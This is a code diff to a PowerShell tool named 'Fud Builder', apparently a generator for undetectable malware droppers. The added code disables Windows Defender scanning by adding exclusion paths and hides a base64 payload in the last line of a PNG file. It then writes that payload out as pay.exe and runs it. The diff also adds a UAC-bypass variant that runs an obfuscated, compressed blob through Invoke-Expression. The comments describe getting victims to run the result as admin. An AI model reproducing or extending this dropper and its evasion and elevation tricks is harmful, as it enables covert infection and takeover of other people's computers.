@@ -31,7 +31,6 @@ public class Dropped
         Process ps = new Process();
         ps.StartInfo.FileName = path + "pay.exe";
         ps.Start();
-        File.Delete(path + "pay.exe");
     }
 }
 "@
@@ -40,6 +39,51 @@ Add-Type -TypeDefinition $CSHARP -Language CSharp
 '@
 
 $EMBEDDED_CODE_ADMIN = @'
+$mypath = $MyInvocation.MyCommand.Path
+$MAIN_PATH = Split-Path $mypath
+$MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
+
+try {
+    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $MAIN_PATH -ErrorAction SilentlyContinue
+} catch {
+    Write-Host "nah"
+}
+
+$CSHARP = @"
+using System.IO;
+using System.Linq;
+using System.Diagnostics;
+using System;
+public class Dropped
+{
+    public static void Main()
+    {
+        string path = Path.GetTempPath();
+        Process pstest = new Process();
+        pstest.StartInfo.FileName = "powershell.exe";
+        pstest.StartInfo.Arguments = " - inputformat none - outputformat none - NonInteractive - Command Add - MpPreference - ExclusionPath path";
+        pstest.Start();
+        string path2 = Directory.GetCurrentDirectory();
+        string image = "REPLACE" + "\\fud.png";
+        var last_line = File.ReadLines(image).Last().ToString();
+        var base64_decode = Convert.FromBase64String(last_line);
+        File.WriteAllBytes(path + "pay.exe", base64_decode);
+        Process ps = new Process();
+        ps.StartInfo.FileName = path + "pay.exe";
+        ps.Start();
+    }
+}
+"@
+
+$CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
+
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
+Add-Type -TypeDefinition $CSHARP -Language CSharp
+[Dropped]::Main()
+'@
+
+$EMBEDDED_CODE_ADMIN_UAC_BYPASS = @'
 $mypath = $MyInvocation.MyCommand.Path
 $MAIN_PATH = Split-Path $mypath
 $MAIN_PATH = $MAIN_PATH.Replace("\", "\\")
@@ -72,16 +116,19 @@ public class Dropped
         Process ps = new Process();
         ps.StartInfo.FileName = path + "pay.exe";
         ps.Start();
-        File.Delete(path + "pay.exe");
     }
 }
 "@
 
 $CSHARP = $CSHARP.Replace("REPLACE", $MAIN_PATH)
 
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
-Add-Type -TypeDefinition $CSHARP -Language CSharp
-[Dropped]::Main()
+$base64_my_path = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Path))
+
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { $code = "$base64_my_path" ; (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) | ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) | InVoKE-expREssION }
+else {
+    Add-Type -TypeDefinition $CSHARP -Language CSharp
+    [Dropped]::Main()
+}
 '@
 
 $inputXML = @'
@@ -161,11 +208,11 @@ function Show-Notification {
     $SerializedXml.LoadXml($RawXml.OuterXml)
 
     $Toast = [Windows.UI.Notifications.ToastNotification]::new($SerializedXml)
-    $Toast.Tag = "PowerShell"
-    $Toast.Group = "PowerShell"
+    $Toast.Tag = "Fud Builder"
+    $Toast.Group = "Fud Builder"
     $Toast.ExpirationTime = [DateTimeOffset]::Now.AddMinutes(1)
 
-    $Notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("PowerShell")
+    $Notifier = [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Fud Builder")
     $Notifier.Show($Toast);
 }
 
@@ -389,7 +436,11 @@ Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
 Hide-Console #Makes it look nice
 #If you don't want UAC admin to be required when running the payload set this to $false
 $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
+$uac_BYPASS = $false #If this is true then the generated script will try and bypass uac admin. If it is false then it will just require admin if $uac_required is true otherwise it will use normal script.
 if ($uac_required -eq $True) {
     $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN
+}
+if ($uac_BYPASS -eq $True) {
+    $EMBEDDED_CODE = $EMBEDDED_CODE_ADMIN_UAC_BYPASS
 }
 $Null = $window.ShowDialog()
